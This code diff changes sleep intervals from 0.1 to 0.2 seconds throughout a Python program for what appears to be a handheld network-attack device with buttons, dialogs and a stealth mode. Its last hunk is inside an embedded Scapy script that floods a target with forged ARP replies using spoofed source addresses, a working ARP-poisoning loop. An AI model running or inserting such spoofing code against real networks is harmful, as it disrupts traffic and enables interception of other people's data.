@@ -300,7 +300,7 @@ def _display_loop():
             if mirror:
                 try:    mirror.save(_FRAME_PATH, "JPEG", quality=80)
                 except: pass
-        time.sleep(0.1)
+        time.sleep(0.2)
 
 
 def start_background_loops():
@@ -338,7 +338,7 @@ def getButton(timeout=None):
                 return v
 
         if not HAS_HW:
-            time.sleep(0.1)
+            time.sleep(0.2)
             continue
 
         # Physical GPIO
@@ -430,7 +430,7 @@ def Dialog_info(text, wait=True, timeout=None):
     elif timeout:
         end = time.time() + timeout
         while time.time() < end:
-            time.sleep(0.1)
+            time.sleep(0.2)
 
 
 def YNDialog(a="Are you sure?", y="Yes", n="No", b=""):
@@ -754,7 +754,7 @@ def enter_stealth():
                     held_since = None
             except Exception:
                 pass
-        time.sleep(0.1)
+        time.sleep(0.2)
 
     ktox_state["stealth"] = False
     Dialog_info("Stealth off", wait=False, timeout=1.5)
@@ -1422,7 +1422,7 @@ try:
     while True:
         for fake_ip in ['10.0.0.{{}}'.format(i) for i in range(1,254)]:
             sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=fake_ip,hwsrc=iface_mac),iface=iface,verbose=0)
-        time.sleep(0.1)
+        time.sleep(0.2)
 except Exception as e:
     print(f'Error: {{e}}')
 """
